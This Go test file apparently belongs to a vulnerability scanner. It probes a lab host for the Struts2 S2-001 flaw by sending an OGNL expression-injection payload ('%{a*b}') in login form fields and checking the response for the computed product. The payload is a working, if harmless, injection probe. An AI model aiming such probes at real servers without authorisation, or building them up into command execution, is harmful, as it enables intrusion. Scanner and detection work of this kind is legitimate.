package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"strconv"
	"strings"
	"testing"
)

func TestS2001(t *testing.T) {
	payload := "username=%25%7B__rand_1__%2A__rand_2__%7D&password=%25%7B__rand_3__%2A__rand_4__%7D"
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	rand3 := tool.GetRandomInt()
	rand4 := tool.GetRandomInt()
	payload = strings.ReplaceAll(payload, "__rand_1__", strconv.Itoa(rand1))
	payload = strings.ReplaceAll(payload, "__rand_2__", strconv.Itoa(rand2))
	payload = strings.ReplaceAll(payload, "__rand_3__", strconv.Itoa(rand3))
	payload = strings.ReplaceAll(payload, "__rand_4__", strconv.Itoa(rand4))
	log.Info("payload: %s", payload)
	headers := make(map[string]string)
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	req := &http.Request{
		Url:     http.NewUrl("http://192.168.222.132:8080/login.action"),
		Method:  "POST",
		Body:    payload,
		Headers: headers,
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) ||
		strings.Contains(string(resp.Body), strconv.Itoa(rand3*rand4)) {
		log.Info("find S2-001")
	}
}
